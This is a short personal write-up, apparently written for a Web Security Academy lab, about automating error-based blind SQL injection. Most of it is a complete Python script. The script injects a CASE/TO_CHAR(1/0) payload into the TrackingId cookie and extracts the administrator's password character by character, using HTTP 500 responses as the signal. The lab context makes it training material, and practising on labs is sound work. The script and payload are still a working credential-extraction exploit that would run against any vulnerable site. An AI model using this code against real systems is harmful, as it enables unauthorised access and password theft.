# My Python Automation Script for Error-Based Blind SQLi

I just use this python script when doing it manually in burp intruder takes too much time or when I need to automate finding the characters for error-based blind sqli (like in PL-11).

### How I wrote this logic
Basically, the script loops through lowercase letters and numbers. I use a payload that checks if the character at a specific position matches my guess. If it is correct, the payload triggers a divide-by-zero error (`1/0`), which forces the backend to throw a `500 Internal Server Error`. 

The script just looks for that `500` status code. If it gets a `500`, it knows the character is right, saves it to the password string, and moves to the next position. If it gets a normal `200` response, it just moves on and tries the next character.

### The Script (`blind-sqli.py`)

```python
import requests
import string

# I need to change these variables for every new lab/target
url = "https://YOUR_LAB_URL.web-security-academy.net/"
tracking = "PUT_TRACKING_ID_HERE" 
session = "PUT_SESSION_COOKIE_HERE"

# The characters I want to guess
chars = string.ascii_lowercase + string.digits
password = ""

print("Starting error-based blind SQLi extraction...")

for pos in range(1, 21):
    found = False
    
    for ch in chars:
        # My payload: forces 1/0 if the character is correct
        payload = (
            tracking
            + "'||(SELECT CASE WHEN SUBSTR(password,"
            + str(pos)
            + ",1)='"
            + ch
            + "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        )

        cookies = {
            "TrackingId": payload,
            "session": session
        }

        try:
            r = requests.get(url, cookies=cookies, timeout=10)
            
            print(f"Testing position {pos} with '{ch}' -> Status: {r.status_code}")

            # If I get a 500 error, my character guess was correct
            if r.status_code == 500:
                password += ch
                print(f"[+] Found character at position {pos}: {ch}")
                print(f"[+] Current password: {password}\n")
                found = True
                break

        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")

    # Break the loop if we hit the end of the password
    if not found:
        print(f"[-] No character found at position {pos}")
        break

print(f"\nFinal password: {password}")
